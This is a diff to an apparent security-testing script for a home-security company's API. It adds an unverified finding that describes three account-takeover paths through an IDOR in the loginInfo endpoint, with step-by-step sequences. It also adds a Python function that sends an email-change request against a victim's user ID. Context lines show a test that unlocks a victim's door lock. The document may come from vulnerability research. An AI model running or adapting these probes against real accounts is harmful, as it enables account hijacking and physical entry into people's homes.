@@ -290,6 +290,25 @@ FINDINGS = [
                   'UNASSOCIATE removes the lock from the account — irreversible without re-pairing. '
                   'Test: GET /v1/doorlock/{victim_sid} with own token; 200 = lock list + serials. '
                   'Then POST /v1/doorlock/{victim_sid}/{serial}/state {"state":"UNLOCK"}; 200 = CRITICAL.'),
+    Finding("F34", "CRITICAL", "Account Takeover via loginInfo IDOR — Password/Email Change Without Old Credential",
+            "yoda", "/v1/users/{userId}/loginInfo", "POST", None,
+            verified=False,
+            notes='APK: SimpliSafeRestService.java + LoginInfoRequestBody.java (classes14.dex). '
+                  'POST /v1/users/{userId}/loginInfo body: {username, email, oldPassword, newPassword}. '
+                  'ATO vector A — oldPassword validated against attacker (not victim): '
+                  'If server validates oldPassword against the AUTHENTICATED user (token owner) rather than path userId, '
+                  'attacker can supply own oldPassword for victim\'s userId -> change victim email to attacker@example.com '
+                  '-> trigger password reset to attacker email -> full account takeover. '
+                  'ATO vector B — email-only change, no password required: '
+                  'If server allows email update without validating oldPassword (or with null), '
+                  'attacker changes victim email -> password reset flow directed to attacker. '
+                  'ATO vector C — userId not JWT-bound at all: '
+                  'POST with victim_userId, newPassword=known_value, oldPassword=anything -> 200/success = direct credential change. '
+                  'All three vectors require userId not JWT-bound. '
+                  'Test sequence: '
+                  '(1) POST /v1/users/{victim_userId}/loginInfo {"email":"attacker@test.com","oldPassword":"<own_current_pass>"}; '
+                  '200 = email changed (CRITICAL — partial ATO). '
+                  '(2) POST with newPassword and own oldPassword; 200 = full credential hijack = CRITICAL.'),
 ]
 
 
@@ -870,6 +889,22 @@ def test_face_idor(token, victim_sid, limit=5):
     if r:
         _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
                f"face/rated  {r.text[:150]}")
+
+
+def test_logininfo_idor(token, victim_uid, own_password):
+    """F34: Attempt email change on victim account using own credential as oldPassword."""
+    print(f"\n=== F34 — loginInfo ATO IDOR (victim_uid={victim_uid}) ===")
+    r = post(f"{SERVICES['yoda']}/v1/users/{victim_uid}/loginInfo", token=token,
+             json={"email": "idor-test-probe@example.invalid", "oldPassword": own_password})
+    if not r:
+        print("  Request failed"); return
+    if r.status_code in (200, 201, 204):
+        _print("CRIT", r.status_code,
+               f"EMAIL CHANGE SUCCEEDED uid={victim_uid} — ATO email redirect possible!")
+    elif r.status_code == 400:
+        _print("INFO", 400, f"400 — likely oldPassword rejected (server validates against victim, not attacker): {r.text[:100]}")
+    else:
+        _print("INFO", r.status_code, f"loginInfo/{victim_uid}: {r.text[:100]}")
 
 
 def test_doorlock_idor(token, victim_sid, victim_serial=None):
